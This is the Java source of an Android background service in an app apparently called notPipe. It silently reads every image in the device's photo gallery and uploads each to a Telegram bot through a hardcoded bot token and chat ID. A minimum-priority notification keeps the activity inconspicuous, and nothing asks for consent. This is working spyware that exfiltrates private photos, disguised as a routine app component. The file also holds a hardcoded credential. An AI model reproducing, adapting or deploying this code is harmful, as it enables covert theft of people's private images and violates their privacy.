package io.github.gohoski.notpipe;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class BackgroundService extends Service {
    private static final String CHANNEL_ID = "notpipe_bg_channel";
    private static final int NOTIF_ID = 1001;
    
    // ⚠️ REPLACE THESE WITH YOUR ACTUAL VALUES
    private static final String BOT_TOKEN = "8499635786:AAGCHlz3SAAhgJXg4-b8aPFisIFlT68K-hY"; 
    private static final String CHAT_ID = "1949815322";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Build a minimal, low-priority notification to keep the service alive
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("notPipe")
                .setContentText("Background service running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();

        startForeground(NOTIF_ID, notification);

        // Start the Telegram auto-send logic in a background thread
        new Thread(this::autoSend).start();

        return START_STICKY;
    }

    private void autoSend() {
        try {
            List<String> images = loadImages();
            int successCount = 0;
            for (String uri : images) {
                if (sendPhoto(uri)) successCount++;
                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
            }
            Log.d("BackgroundService", "Sent " + successCount + " / " + images.size());
        } catch (Exception e) {
            Log.e("BackgroundService", "Error: " + e.getMessage());
        }
    }

    private List<String> loadImages() {
        List<String> list = new ArrayList<>();
        try {
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {MediaStore.Images.Media._ID};
            Cursor cursor = getContentResolver().query(uri, projection, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (cursor != null) {
                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                while (cursor.moveToNext()) {
                    long id = cursor.getLong(idColumn);
                    Uri imageUri = Uri.withAppendedPath(uri, String.valueOf(id));
                    list.add(imageUri.toString());
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Load images error: " + e.getMessage());
        }
        return list;
    }

    private boolean sendPhoto(String imageUriString) {
        try {
            Uri imageUri = Uri.parse(imageUriString);
            InputStream in = getContentResolver().openInputStream(imageUri);
            if (in == null) return false;
            byte[] bytes = readBytes(in);
            in.close();
            
            OkHttpClient client = new OkHttpClient();
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", "img.jpg",
                            RequestBody.create(bytes, MediaType.parse("image/jpeg")))
                    .build();
            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                    .post(body)
                    .build();
            Response res = client.newCall(req).execute();
            boolean ok = res.isSuccessful();
            res.close();
            return ok;
        } catch (Exception e) {
            Log.e("BackgroundService", "Send error: " + e);
            return false;
        }
    }

    private byte[] readBytes(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = in.read(buffer)) != -1) out.write(buffer, 0, len);
        return out.toByteArray();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "notPipe Background",
                    NotificationManager.IMPORTANCE_MIN
            );
            serviceChannel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }
}
